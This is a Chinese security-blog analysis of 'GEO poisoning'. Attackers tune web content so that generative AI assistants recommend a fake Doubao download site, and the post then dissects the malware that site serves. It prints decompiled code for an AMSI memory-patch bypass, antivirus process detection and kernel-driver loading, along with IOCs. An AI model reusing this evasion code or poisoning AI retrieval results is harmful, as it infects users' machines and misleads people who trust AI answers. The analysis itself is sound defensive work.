---
title: 【先知】GEO与AI投毒样本（“豆包”）分析
source: https://xz.aliyun.com/news/92829
source_host: xz.aliyun.com
clip_date: 2026-09-14T19:52:24+08:00
trace_id: 57c0e652-2e90-4f63-9bac-9d463a809d31
content_hash: 8ac89bae94e9063d1449ae25e00b588679c5f7f7d66e5f3fd34c92578431760a
status: synced
tags:
  - 先知
  - 恶意样本
  - AI应用
series: null
feed_source: 先知安全技术社区
ai_summary: 攻击者用 GEO 让生成式 AI 把仿冒豆包下载站当作权威答案推荐，形成“投毒→诱导下载→落地执行”的攻击链。
ai_summary_style: key-points
images_status:
  total: 29
  succeeded: 29
  failed_urls: []
notion_page_id: 3db75244-d011-8196-a76a-dc1179b6326b
ioc:
  cves: []
  cwes: []
  hashes:
    - 0b901dcc4f13f0ddc65e886ca59fac64c78f9381cb0f27e80414773c263371af
    - 2cbd8ff50297bd100ee4892503ac7870c7a7b9a8
    - b18e6df04b25b7f15e2ffb884315cc25abb0ff84ca30c6382543f9e4ae9243a3
    - b29624864550b151143c6a461ba6288d
    - c227d58ec808a27ff372b2e031e1ec5e6fd402bc
    - e36064a805db9c95199814265a7f2225
  domains: []
  tools: []
  techniques: []
---

> 💡 **AI 总结（key-points）**
>
> 攻击者用 GEO 让生成式 AI 把仿冒豆包下载站当作权威答案推荐，形成“投毒→诱导下载→落地执行”的攻击链。
> 
> - **攻击链：** GEO 投毒使 AI 推荐仿冒豆包站，诱导下载 doubaoai-app.exe，再释放 ConfigManager.exe 完成提权、禁用 Defender、AMSI 补丁、驱动加载与计划任务持久化。
> - **样本与域名：** 主样本 SHA256 b18e6df0...e9243a3，二级 SHA256 0b901dcc...371af；仿冒域 doubao-app.com、doubao-zh.hl.cn，官方域 doubao.com。
> - **持久化/落点：** 计划任务 AdobeAcrobatUpdate-8776、-F130；落地 %Temp%\ConfigManager.exe、%AppData%\Roaming\B2D6568600009934\、%Temp%\随机.sys。
> - **对抗与驱动：** runas 提权；改 HKLM Defender 策略；AmsiScanBuffer 补丁为 xor eax,eax;ret；枚举 MsMpEng/火绒/360/卡巴/ESET/腾讯管家；注册服务 Type=1、Start=3 后 NtLoadDriver，驱动需安全模式删除。

## 前言

> 本文主要内容是：攻击者把 GEO 技术"武器化"，让恶意下载站被生成式 AI 当作权威答案推荐给用户，从而完成"投毒 → 诱导下载 → 落地执行"的闭环。

**关键事实速览**

|     |     |
| --- | --- | 
| 项目  | 值   |
| 主样本 doubaoai-app.exe SHA256 | b18e6df04b25b7f15e2ffb884315cc25abb0ff84ca30c6382543f9e4ae9243a3 |
| 二级样本 ConfigManager.exe SHA256 | 0b901dcc4f13f0ddc65e886ca59fac64c78f9381cb0f27e80414773c263371af |
| 仿冒/恶意域名 | doubao-app.com、doubao-zh.hl.cn |
| 持久化 | 计划任务 AdobeAcrobatUpdate-8776 / AdobeAcrobatUpdate-F130 |
| 落地点 | %Temp%\\ConfigManager.exe、%AppData%\\Roaming\\B2D6568600009934\\ |
| 反检测手段 | UAC 绕过、禁用 Defender 策略、AMSI 内存补丁、杀软进程枚举、内核驱动加载 |

## GEO 与 SEO 技术原理对比

SEO（搜索引擎优化）：针对传统搜索引擎（Google、Bing、百度等）的算法特性，对网站进行技术、内容和外链层面的优化，目的是提高网页在搜索结果页（SERP）中的自然排名，获取免费流量。

GEO（生成式引擎优化）：针对生成式AI平台（如ChatGPT、DeepSeek、Perplexity等）的知识召回与答案生成机制进行优化，目的是让品牌或网站的结构化信息被AI模型识别、信任，并在其生成的回答中直接引用。

两者在底层逻辑、输出载体、优化对象、索引方式及核心壁垒上存在本质区别，具体对比如下表：

|     |     |     |
| --- | --- | --- |  
| 对比维度 | 传统SEO | 生成式引擎优化（GEO） |
| 底层逻辑 | 关键词密度、外链权重、域名年龄 | 语义相似度、实体关系、事实一致性 |
| 输出载体 | 搜索结果页的文字链与摘要 | AI生成的段落、表格、要点式综合答案 |
| 优化对象 | 网页（URL）及其HTML内容 | 语义向量、知识图谱中的实体与关系 |
| 索引方式 | 倒排索引（基于关键词→文档映射） | 向量数据库（密集向量检索）+ 图数据库 |
| 核心壁垒 | 海量高质量外链资源 | 高质量结构化数据与跨平台权威引用 |

**1\. SEO的“三层架构”：爬取 → 索引 → 排名**

SEO的技术根基建立在传统搜索引擎的三级工作流之上：

爬取（Crawling）：搜索引擎通过爬虫程序（如Googlebot）遍历互联网上的公开网页。优化的技术重点包括：服务器响应速度（推荐使用CDN、启用HTTP/2）、移动端适配（移动优先索引已成强制标准）、内部链接结构（避免孤立页面与死链）。据2025年行业统计，约有35%的网站存在阻碍正常爬取的技术问题，优化爬取预算可使自然流量提升15%-20%。

索引（Indexing）：搜索引擎将爬取到的网页内容解析、去重并存入索引库。其核心数据结构是倒排索引——以“关键词”为中心，记录该词出现在哪些文档中，从而支持毫秒级检索。此阶段需确保URL规范化、语义化HTML结构（如<h1>、<article>、<schema>标记）完整，避免noindex标签误用。

### 2.1 SEO 的"三层架构"：爬取 → 索引 → 排名

SEO 的技术根基建立在传统搜索引擎的三级工作流之上：

-   **爬取（Crawling）**：搜索引擎通过爬虫程序（如 Googlebot）遍历互联网上的公开网页。优化的技术重点包括：服务器响应速度（推荐使用 CDN、启用 HTTP/2）、移动端适配（移动优先索引已成强制标准）、内部链接结构（避免孤立页面与死链）。据 2025 年行业统计，约有 35% 的网站存在阻碍正常爬取的技术问题，优化爬取预算可使自然流量提升 15%–20%。
-   **索引（Indexing）**：搜索引擎将爬取到的网页内容解析、去重并存入索引库。其核心数据结构是倒排索引——以"关键词"为中心，记录该词出现在哪些文档中，从而支持毫秒级检索。此阶段需确保 URL 规范化、语义化 HTML 结构（如 `<h1>` 、 `<article>` 、 `<schema>` 标记）完整，避免 `noindex` 标签误用。
-   **排名（Ranking）**：当用户发起查询时，搜索引擎依据 TF-IDF、BM25 等算法评估文档与查询的匹配度，再经 PageRank 等链接分析算法综合排序。近年来，Google 还引入了 BERT、RankBrain 等机器学习模型，以更好地理解查询意图与上下文。最终排名是相关性、权威性、用户体验（加载速度、跳出率、移动友好度）的加权结果。

### 2.2 GEO 的"三层能力"：被发现 → 被理解 → 被推荐

GEO 并非简单复用 SEO 方法，而是基于大语言模型（LLM）的 RAG（检索增强生成）架构构建的全新优化体系。完整的 GEO 链路可概括为"被发现—被理解—被推荐"三层递进能力：

-   **基础层：被发现**。确保 AI 模型的检索模块能够抓取到品牌内容。与传统爬虫不同，生成式引擎的数据来源更加多元：既包括公开网页（由通用爬虫获取），也包括知识库（如 Wikidata）、结构化开放数据（如 Schema.org 标记的实体）、以及授权 API 接入的第一方数据。优化策略是在多个高可信平台（政府网站、学术数据库、行业知识库）留下品牌信息的"痕迹"，提高覆盖广度。
-   **核心层：被理解**。AI 模型需要将内容转化为语义向量，并建立实体关系。这要求内容具有极高的结构化程度与语义清晰度。技术上，广泛使用 JSON-LD 格式的 Schema 标记（如 `Product` 、 `Organization` 、 `Claim` 等实体类型）、保持术语一致性、提供丰富的数据表格与列表，能显著提升 AI 的理解效率。内容越接近"知识图谱节点"而非"散文段落"，被正确引用的概率越高。
-   **目标层：被推荐**。AI 在生成答案时，会从多个检索结果中选择最相关、最权威、最新鲜的信息片段进行融合。因此，除了基础的结构化与可发现性，还需构建信任资产：包括域名的长期稳定性、外部权威来源的引用（如被主流媒体或学术论文提及）、事实准确性的可验证性（提供明确的参考文献链接）。当前主流的 GEO 技术方案中，一般包含四层自研架构：L1 数据底座层（原始资料结构化）、L2 语义处理层（向量检索与合规过滤）、L3 任务调度层（多平台适配）、L4 数据观测层（收录监测与指标统计）。

* * *

## 3\. GEO 投毒攻击原理：

### 3.1 DeepSeek 答案来源机制（以"代码审计"为例）

以 DeepSeek 为例，当输入一个问题时，会提供答案的来源。如下图所示：当输入代码审计的问题时，可以看见来源主要是一些专业论坛、知名从业人员等（例如：网安一哥奇安信、博客园、前辈 phith0n 等）。

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/10923334776c60c3.png)

以输入的"代码审计"问题为例，DeepSeek 给出的答案引用来源主要呈现以下特征：

-   **专业论坛（如博客园、LINUX DO 等）**：技术社区内容在 DeepSeek 的技术类问题回答中占据高权重。这类来源的优势在于：内容由一线开发者产出，具有实操性和可验证性；讨论串形式覆盖了多种场景和边缘情况；社区声誉机制天然筛选了高质量内容。
-   **知名从业人员（如前辈 phith0n 等安全领域专家）**：个人技术博客或知名从业者的公开发布内容，因其专业深度和行业认可度，在 DeepSeek 的信源评分中获得较高的"权威性"与"可信度"加分。DeepSeek 的 RAG 机制在检索阶段会对信源进行初步的权威性评分，只有通过初筛的文档才会进入后续的推理生成环节。
-   **权威机构（如奇安信等网安头部企业）**：头部安全厂商发布的技术报告、漏洞分析、最佳实践等内容，兼具专业深度与机构背书，在 DeepSeek 的信源筛选中具有明显优势。DeepSeek 在生成阶段的交叉验证机制，会优先采信多个权威信源共同验证的信息。

### 3.2 DeepSeek 的 RAG 双引擎架构

DeepSeek 采用检索引擎与生成引擎独立协同的双引擎 RAG 架构：

-   **底层检索引擎**：分布式大容量检索引擎，支持 PB 级知识库的毫秒级响应，负责从全网公开信息、授权知识库、垂直领域数据库中召回相关文档。
-   **上层生成引擎**：基于 DeepSeek 大模型的深度推理能力，对召回的文档进行理解、验证、整合与生成。

### 3.3 四阶段引用决策流程

DeepSeek 从接收用户查询到最终生成带引用标注的答案，完整经历四个核心决策阶段：

|     |     |     |
| --- | --- | --- |  
| **决策阶段** | **核心动作** | **内容筛选标准** |
| 查询理解阶段 | 实体识别、意图解析、语境消歧 | 准确理解用户提问的真实意图 |
| 候选召回阶段 | 多路检索、向量匹配 | 语义相似度、信源覆盖度 |
| 信源评分阶段 | 多维度打分、重排 | 权威性、内容质量、语义相关、时效性等 |
| 答案生成阶段 | 交叉验证、融合生成 | 事实一致性、多源佐证 |

### 3.4 DeepSeek 引用内容的四大核心因素

DeepSeek 决定引用谁、推荐谁，主要受四个核心因素影响：

1.  **内容权威性**：DeepSeek 倾向引用结构清晰、内容优质、信息准确的页面——开篇有明确结论、段落自包含、有对比表或步骤、覆盖追问子问题。营销话术、内容空洞或信息错误的内容难以被引用。
2.  **品牌实体清晰度**：如果品牌在不同渠道描述不一致，DeepSeek 难以建立稳定理解，就不会在相关提问里推荐该品牌。核心描述统一、与业务能力稳定关联的品牌，更容易被准确识别和推荐。
3.  **问法匹配度**：DeepSeek 基于用户提问生成回答，只有内容匹配用户的提问意图，才会被引用。企业需要覆盖决策类、对比类、咨询类等真实问法。
4.  **来源可信度**：DeepSeek 综合多个内容来源——搜索引擎索引、权威媒体、知识平台、技术社区。来自权威媒体、知名平台、官方渠道的内容可信度高，更易被引用。

### 3.5 "GEO 投毒"攻击链

将 3.1–3.4 的机制反过来用，即构成投毒攻击。攻击者无需攻破 AI，只需 **制造"符合 AI 引用偏好"的恶意内容**，让 AI 主动把用户导向恶意站点：

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/0f94d0af8de13913.png)

**于是乎，某些人群通过GEO来影响主流ai，投放一些恶意软件进行投毒。接下来进入实际案例**

## 实际案例——伪装豆包AI助手样本分析

故事的开端是用户在生成式 AI 中询问"豆包官方下载地址"，得到如下回答（注意其中混入了真实主域与仿冒子域）：

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/83ffdb3b832434e6.png)

## doubaoai-app.exe

访问网址之后，发现是做了包装的

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/56bc17271f48cbef.png)

### hash

```plain
SHA256:b18e6df04b25b7f15e2ffb884315cc25abb0ff84ca30c6382543f9e4ae9243a3
MD5:b29624864550b151143c6a461ba6288d
SHA1:c227d58ec808a27ff372b2e031e1ec5e6fd402bc
```

### 动态行为分析

创建ConfigManager.exe

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/423c3e37ca8a41fd.png)

执行ConfigManager.exe

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/62713fbe8d0b5b3d.png)

找到落地文件

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/fa2d5fa8cac34c75.png)

其他行为，找到释放文件路径即可

```plain
### 1. 进程创建与执行
- 创建位置 ： C:\Users\orange\Desktop\doubaoai-app.exe (EXEC_create)
- 执行 ConfigManager.exe ：通过 C:\Users\orange\AppData\Local\Temp\ConfigManager.exe (PROC_exec, target_pid:3652)
### 2. 文件操作
- 写入 ConfigManager.exe ：
  - C:\Users\orange\AppData\Local\Temp\ConfigManager.exe (FILE_touch, FILE_write, FILE_modified)
- 访问安装程序 ：
  - C:\Users\orange\AppData\Local\Temp\Doubao_installer_2.1.8.exe (FILE_open)
### 3. 注册表操作
- 系统策略 ：
  - HKEY_LOCAL_MACHINE\SOFTWARE\Policies
  - HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\safer\codeidentifiers
- Explorer 配置 ：
  - HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\FolderDescriptions
  - 多个 {GUID}\PropertyBag\ThisPCPolicy 键的查询
- 文件关联 ：
  - HKEY_LOCAL_MACHINE\SOFTWARE\Classes\.exe
  - HKEY_LOCAL_MACHINE\SOFTWARE\Classes\exefile
- 用户配置 ：
  - HKEY_USERS\S-1-5-21-23748335-3516904018-4237679811-1000\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer
```

## ConfigManager.exe样本核心功能

### hash

```plain
SHA256:0b901dcc4f13f0ddc65e886ca59fac64c78f9381cb0f27e80414773c263371af
MD5:e36064a805db9c95199814265a7f2225
SHA1:2cbd8ff50297bd100ee4892503ac7870c7a7b9a8
```

### IDA静态分析

使用IDA MCP让其提供恶意样本的核心功能及行为

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/1f703e595c19ce85.png)

#### 权限提升

通过GetTokenInformation 函数调用，检查当前进程是否以管理员身份运行。如果没有管理员权限，使用 ShellExecuteExA 以 "runas" 动词重新启动程序

```plain
// 尝试打开当前进程的访问令牌，获取查询权限
if ( OpenProcessToken(CurrentProcess, 8u, &TokenHandle) ) 
{ 
  // 清空TokenInformation变量，确保初始值为0
  memset(&TokenInformation, 0, sizeof(TokenInformation)); 
  // 设置缓冲区大小为4字节（TOKEN_ELEVATION结构体大小）
  TokenInformationLength = 4; 
  // 获取令牌的提升状态，判断是否以管理员权限运行
  if ( GetTokenInformation(TokenHandle, TokenElevation, &TokenInformation, 4u, &TokenInformationLength) ) 
    // 如果获取成功，将提升状态存储到v5变量
    // v5非0表示具有管理员权限
    v5 = TokenInformation; 
  // 关闭令牌句柄，释放系统资源
  CloseHandle(TokenHandle); 
}
```

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/23d1f8920560eb11.png)

sub_140001EA0函数获取 "runas" 字符串

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/159a8d8a3ddb3d97.png)

#### 禁用 Windows Defender 和安全中心

```plain
HKLM\SOFTWARE\Policies\Microsoft\Windows Defender
```

sub_140001740函数用于修改 AmsiScanBuffer 函数，通过内存补丁禁用 Windows

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/7929e4c5b9335d09.png)

```plain
// 函数功能：恶意代码核心逻辑 —— 绕过 Windows AMSI（反恶意软件扫描接口）
// 目的：让杀毒软件/系统安全机制无法检测后续的恶意行为
void sub_140001740()
{
  HANDLE CurrentProcess; // rax，当前进程句柄
  int i; // [rsp+30h] [rbp-B8h]，循环计数器
  unsigned int v2; // [rsp+34h] [rbp-B4h] BYREF，内存保护属性临时变量
  FARPROC v3; // [rsp+38h] [rbp-B0h]，最终要修改的 AmsiScanBuffer 函数地址
  HMODULE v4; // [rsp+40h] [rbp-A8h]，加载的动态库句柄（amsi.dll / kernel32.dll）
  HMODULE hModule; // [rsp+48h] [rbp-A0h]，获取的模块句柄
  FARPROC ProcAddress; // [rsp+50h] [rbp-98h]，LoadLibraryW 函数地址
  _BYTE v7[8]; // [rsp+58h] [rbp-90h] BYREF，要写入的恶意机器码
  CHAR ProcName[16]; // [rsp+60h] [rbp-88h] BYREF，函数名：LoadLibraryW
  char v9[16]; // [rsp+70h] [rbp-78h] BYREF，函数名：AmsiScanBuffer
  _WORD v10[28]; // [rsp+80h] [rbp-68h] BYREF，宽字符字符串：要加载的 DLL 名称
  CHAR ModuleName[24]; // [rsp+B8h] [rbp-30h] BYREF，模块名：kernel32.dll

  // 关键判断：全局钩子/函数指针存在才执行（恶意环境初始化标记）
  if ( qword_14003A528 )
  {
    // 拼接宽字符串：amsi.dll（反恶意软件接口核心 DLL）
    v10[0] = 97;   // a
    v10[1] = 109;  // m
    v10[2] = 115;  // s
    v10[3] = 105;  // i
    v10[4] = 46;   // .
    v10[5] = 100;  // d
    v10[6] = 108;  // l
    v10[7] = 108;  // l
    v10[8] = 0;    // 结束符

    // 目标函数：AmsiScanBuffer（AMSI 核心扫描函数）
    strcpy(v9, "AmsiScanBuffer");

    // 拼接宽字符串：kernel32.dll
    v10[12] = 107; // k
    v10[13] = 101; // e
    v10[14] = 114; // r
    v10[15] = 110; // n
    v10[16] = 101; // e
    v10[17] = 108; // l
    v10[18] = 51;  // 3
    v10[19] = 50;  // 2
    v10[20] = 46;  // .
    v10[21] = 100; // d
    v10[22] = 108; // l
    v10[23] = 108; // l
    v10[24] = 0;   // 结束符

    // 要获取的函数：LoadLibraryW（加载 DLL 的关键 API）
    strcpy(ProcName, "LoadLibraryW");
    v4 = 0;

    // 解密/解析模块名：kernel32.dll
    sub_140001010(ModuleName, &unk_1400215B8, 12);

    // 获取 kernel32.dll 模块句柄
    hModule = GetModuleHandleA(ModuleName);

    // 成功获取模块
    if ( hModule )
    {
      // 获取 LoadLibraryW 函数地址
      ProcAddress = GetProcAddress(hModule, ProcName);

      // 成功获取函数
      if ( ProcAddress )
        // 调用 LoadLibraryW 加载 amsi.dll / kernel32.dll
        v4 = (HMODULE)((__int64 (__fastcall *)(_WORD *))ProcAddress)(v10);
    }

    // 成功加载目标 DLL
    if ( v4 )
    {
      // 获取 AmsiScanBuffer 函数地址（核心目标）
      v3 = GetProcAddress(v4, v9);

      // 成功获取 AMSI 扫描函数
      if ( v3 )
      {
        // 机器码指令：直接让 AmsiScanBuffer 返回 0（失效）
        // xor eax, eax + ret （经典 AMSI 绕过补丁）
        v7[0] = 49;    // 0x31
        v7[1] = -64;   // 0xC0
        v7[2] = -61;   // 0xC3
        v7[3] = -112;
        v7[4] = -112;
        v2 = 0;

        // 修改内存属性为可写（PAGE_EXECUTE_READWRITE）
        if ( (unsigned int)qword_14003A528(v3, 5, 64, &v2) )
        {
          // 判断是否使用 NtProtectVirtualMemory / 直接写内存
          if ( qword_14003A550 )
          {
            // 获取当前进程
            CurrentProcess = GetCurrentProcess();
            // 调用 WriteProcessMemory 写入恶意机器码
            qword_14003A550(CurrentProcess, v3, v7, 5, 0);
          }
          else
          {
            // 直接内存覆盖写入（更暴力）
            for ( i = 0; i < 5; ++i )
              *((_BYTE *)v3 + i) = v7[i];
          }

          // 恢复内存保护属性
          qword_14003A528(v3, 5, v2, &v2);
        }
      }
    }
  }
}
```

样本中内置大量安全工具相关字符串。检测名单：MsMpEng.exe(Defender)、HipsDaemon.exe(火绒)、360tray.exe(360)、avp.exe(卡巴斯基)、ekrn.exe(ESET NOD32)、QQPCTray.exe(腾讯电脑管家)。该名单反映样本主要面向中文 Windows 环境。

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/c2d7727b2882d0ba.png)

顺着字符串找到sub_140002DF0函数，用于检测杀毒软件

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/05822498064e9fc3.png)

```plain
// 函数功能：枚举系统进程，检测是否存在主流杀毒软件进程
// 返回值：1 = 检测到杀软进程  |  0 = 未检测到
__int64 sub_140002DF0()
{
  int i;                          // 循环计数器
  unsigned int v2;                // 标记位：1=找到杀软进程，0=未找到
  DWORD ExitCode;                 // 接收进程退出码（用于判断进程是否存活）
  HANDLE hSnapshot;               // 进程快照句柄
  HANDLE hProcess;                // 打开的目标进程句柄
  PROCESSENTRY32 pe;              // 进程信息结构体（存储进程名、PID等）
  _QWORD v7[7];                   // 杀软进程名列表数组

  // ====================== 核心：要检测的杀毒软件进程名 ======================
  v7[0] = "MsMpEng.exe";          // Windows Defender 杀毒引擎
  v7[1] = "HipsDaemon.exe";       // 火绒相关防护进程
  v7[2] = "360tray.exe";          // 360安全卫士托盘进程
  v7[3] = "avp.exe";              // 卡巴斯基杀毒
  v7[4] = "ekrn.exe";             // ESET NOD32杀毒
  v7[5] = "QQPCTray.exe";         // 腾讯电脑管家托盘进程
  v7[6] = 0;                      // 数组结束标记

  // ====================== 创建系统进程快照 ======================
  // 2u = TH32CS_SNAPPROCESS，枚举所有进程
  hSnapshot = CreateToolhelp32Snapshot(2u, 0);
  
  // 创建快照失败直接返回0
  if (hSnapshot == (HANDLE)-1LL)
    return 0;

  // 初始化 PROCESSENTRY32 结构体（必须设置大小，否则API调用失败）
  pe.dwSize = 304;
  // 清空结构体剩余内存
  memset(&pe.cntUsage, 0, 0x12Cu);

  v2 = 0;  // 初始标记：未找到杀软

  // ====================== 开始遍历第一个进程 ======================
  if (Process32First(hSnapshot, &pe))
  {
    do
    {
      // 遍历杀软进程名列表
      for (i = 0; v7[i]; ++i)
      {
        // 对比当前进程名是否 == 杀软进程名（sub_14000CBD0是字符串比较函数）
        if (!(unsigned int)sub_14000CBD0(pe.szExeFile, v7[i]))
        {
          // 匹配成功：打开目标进程（0x1000 = PROCESS_QUERY_LIMITED_INFORMATION）
          hProcess = OpenProcess(0x1000u, 0, pe.th32ProcessID);
          
          if (hProcess)
          {
            ExitCode = 259;  // 259 = STILL_ACTIVE（进程运行中）
            // 获取进程退出码，判断是否真的在运行
            GetExitCodeProcess(hProcess, &ExitCode);
            CloseHandle(hProcess);  // 关闭进程句柄

            // 退出码=259 → 进程正在运行
            if (ExitCode == 259)
              v2 = 1;  // 标记：检测到运行中的杀软
          }
          break;  // 找到一个就跳出循环
        }
      }
    }
    // 没找到杀软，就继续遍历下一个进程
    while (!v2 && Process32Next(hSnapshot, &pe));
  }

  CloseHandle(hSnapshot);  // 关闭进程快照
  return v2;  // 返回结果：1=有杀软，0=无杀软
}
```

#### 释放驱动文件

sub_1400037C0 函数主要的作用是创建、加载和清理恶意驱动文件。

IDA伪代码如下：

```plain
__int64 sub_1400037C0()
{
  size_t v0; // rax
  DWORD (__stdcall *v2)(LPVOID); // rax
  int v3; // eax
  HANDLE CurrentProcess; // rax
  _BYTE v5[4]; // [rsp+50h] [rbp-6D8h] BYREF
  int v6; // [rsp+54h] [rbp-6D4h]
  HKEY hKey; // [rsp+58h] [rbp-6D0h] BYREF
  int v8; // [rsp+60h] [rbp-6C8h]
  BOOL v9; // [rsp+64h] [rbp-6C4h]
  HANDLE hHandle; // [rsp+68h] [rbp-6C0h]
  BYTE Data[4]; // [rsp+74h] [rbp-6B4h] BYREF
  BYTE v13[4]; // [rsp+78h] [rbp-6B0h] BYREF
  BYTE v14[4]; // [rsp+7Ch] [rbp-6ACh] BYREF
  HMODULE hModule; // [rsp+80h] [rbp-6A8h]
  HANDLE TokenHandle; // [rsp+88h] [rbp-6A0h] BYREF
  FARPROC ProcAddress; // [rsp+90h] [rbp-698h]
  FARPROC v18; // [rsp+98h] [rbp-690h]
  HANDLE FileW; // [rsp+A0h] [rbp-688h]
  DWORD v20; // [rsp+A8h] [rbp-680h]
  size_t BufferCount; // [rsp+B0h] [rbp-678h]
  _BYTE v22[16]; // [rsp+B8h] [rbp-670h] BYREF
  _BYTE pSecurityDescriptor[40]; // [rsp+C8h] [rbp-660h] BYREF
  struct _TOKEN_PRIVILEGES NewState; // [rsp+F0h] [rbp-638h] BYREF
  char Source[8]; // [rsp+100h] [rbp-628h] BYREF
  char v26[16]; // [rsp+108h] [rbp-620h] BYREF
  CHAR Name[24]; // [rsp+118h] [rbp-610h] BYREF
  char Destination[16]; // [rsp+130h] [rbp-5F8h] BYREF
  CHAR ModuleName[16]; // [rsp+140h] [rbp-5E8h] BYREF
  CHAR ProcName[24]; // [rsp+150h] [rbp-5D8h] BYREF
  CHAR MultiByteStr[32]; // [rsp+168h] [rbp-5C0h] BYREF
  char v32[40]; // [rsp+188h] [rbp-5A0h] BYREF
  WCHAR pObjectName[32]; // [rsp+1B0h] [rbp-578h] BYREF
  CHAR SubKey[256]; // [rsp+1F0h] [rbp-538h] BYREF
  WCHAR WideCharStr[264]; // [rsp+2F0h] [rbp-438h] BYREF
  char Buffer[512]; // [rsp+500h] [rbp-228h] BYREF

  sub_140005A60((__int64)byte_14003A668, 8);
  sub_140005A60((__int64)Destination, 8);
  strcpy(Source, ".sys");
  strcat(Destination, Source);
  GetTempPathA(0x104u, Str);
  BufferCount = 260 - strlen(Str);
  v0 = strlen(Str);
  snprintf(&Str[v0], BufferCount, "%s", Destination);
  if ( !(unsigned int)sub_140005D50(Str) )
    return -1;
  qword_14003A688 = (__int64)Str;
  qword_14003A690 = (__int64)byte_14003A668;
  dword_14003A698 = 0;
  memset(v5, 0, 1u);
  v2 = (DWORD (__stdcall *)(LPVOID))sub_140006930(v5);
  hHandle = CreateThread(0, 0, v2, &qword_14003A688, 0, 0);
  v6 = 0;
  if ( hHandle )
  {
    if ( WaitForSingleObject(hHandle, 0x1388u) )
      TerminateThread(hHandle, 0);
    else
      v6 = dword_14003A698;
    CloseHandle(hHandle);
  }
  else
  {
    v6 = sub_140006140(Str, byte_14003A668);
  }
  if ( v6 )
    goto LABEL_33;
  sub_140005950(ModuleName, "4.>66t>66", 9);
  hModule = GetModuleHandleA(ModuleName);
  if ( hModule )
  {
    sub_140005950(ProcName, &unk_1400219C0, 20);
    strcpy(v26, "NtLoadDriver");
    ProcAddress = GetProcAddress(hModule, ProcName);
    v18 = GetProcAddress(hModule, v26);
    if ( ProcAddress )
    {
      if ( v18 )
      {
        strcpy(v32, "SYSTEM\\CurrentControlSet\\Services\\");
        memset(SubKey, 0, sizeof(SubKey));
        snprintf(SubKey, 0x100u, "%s%s", v32, byte_14003A668);
        memset(WideCharStr, 0, 0x208u);
        MultiByteToWideChar(0, 0, Str, -1, WideCharStr, 260);
        hKey = 0;
        if ( !RegCreateKeyExA(HKEY_LOCAL_MACHINE, SubKey, 0, 0, 0, 2u, 0, &hKey, 0) )
        {
          *(_DWORD *)Data = 1;
          *(_DWORD *)v13 = 3;
          *(_DWORD *)v14 = 0;
          RegSetValueExA(hKey, "Type", 0, 4u, Data, 4u);
          RegSetValueExA(hKey, "Start", 0, 4u, v13, 4u);
          RegSetValueExA(hKey, "ErrorControl", 0, 4u, v14, 4u);
          v3 = sub_14000CEF0(WideCharStr);
          RegSetValueExW(hKey, L"ImagePath", 0, 2u, (const BYTE *)WideCharStr, 2 * v3 + 2);
          RegCloseKey(hKey);
          memset(Buffer, 0, sizeof(Buffer));
          sprintf_s(Buffer, 0x100u, L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Services\\%S", byte_14003A668);
          memset(v22, 0, sizeof(v22));
          ((void (__fastcall *)(_BYTE *, char *))ProcAddress)(v22, Buffer);
          v8 = ((__int64 (__fastcall *)(_BYTE *))v18)(v22);
          v9 = !v8 || v8 == -1073741554;
          v6 = v9;
          if ( !v9 )
            RegDeleteKeyA(HKEY_LOCAL_MACHINE, SubKey);
        }
      }
    }
  }
  if ( v6 )
  {
LABEL_33:
    if ( !DeleteFileA(Str) )
      sub_140005ED0(Str);
    sub_140005950(MultiByteStr, &unk_1400218D8, 26);
    MultiByteToWideChar(0, 0, MultiByteStr, -1, pObjectName, 32);
    TokenHandle = 0;
    CurrentProcess = GetCurrentProcess();
    if ( OpenProcessToken(CurrentProcess, 0x28u, &TokenHandle) )
    {
      strcpy(Name, "SeSecurityPrivilege");
      NewState.PrivilegeCount = 1;
      memset(NewState.Privileges, 0, sizeof(NewState.Privileges));
      if ( LookupPrivilegeValueA(0, Name, &NewState.Privileges[0].Luid) )
      {
        NewState.Privileges[0].Attributes = 2;
        AdjustTokenPrivileges(TokenHandle, 0, &NewState, 0, 0, 0);
      }
      CloseHandle(TokenHandle);
    }
    memset(pSecurityDescriptor, 0, sizeof(pSecurityDescriptor));
    InitializeSecurityDescriptor(pSecurityDescriptor, 1u);
    SetSecurityDescriptorDacl(pSecurityDescriptor, 1, 0, 0);
    v20 = SetNamedSecurityInfoW(pObjectName, SE_FILE_OBJECT, 4u, 0, 0, 0, 0);
    FileW = CreateFileW(pObjectName, 0xC0000000, 3u, 0, 3u, 0x80u, 0);
    if ( FileW == (HANDLE)-1LL )
      sub_140006690(byte_14003A668);
    return (__int64)FileW;
  }
  else
  {
    sub_140005ED0(Str);
    return -1;
  }
}
```

调用 sub_140005A60 函数生成两个随机字符串

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/5b88778a5e80b83c.png)

然后构造驱动文件路径

```plain
sub_140005A60(byte_14003A668, 8); /* 生成8字符的服务名 */
sub_140005A60(Destination, 8); /* 生成8字符的文件名前缀 */
strcpy(Source, ".sys");
strcat(Destination, Source);
GetTempPathA(0x104u, Str);//获取当前用户目录
BufferCount = 260 - strlen(Str);
v0 = strlen(Str);
snprintf(&Str[v0], BufferCount, "%s", Destination);


- GetTempPathA 函数获取的是当前用户的临时目录
- 该函数会检查以下环境变量来确定临时目录：

1. TMP 环境变量
2. TEMP 环境变量
3. USERPROFILE 环境变量（如果前两个不存在）
4. Windows 目录（如果所有环境变量都不存在）
```

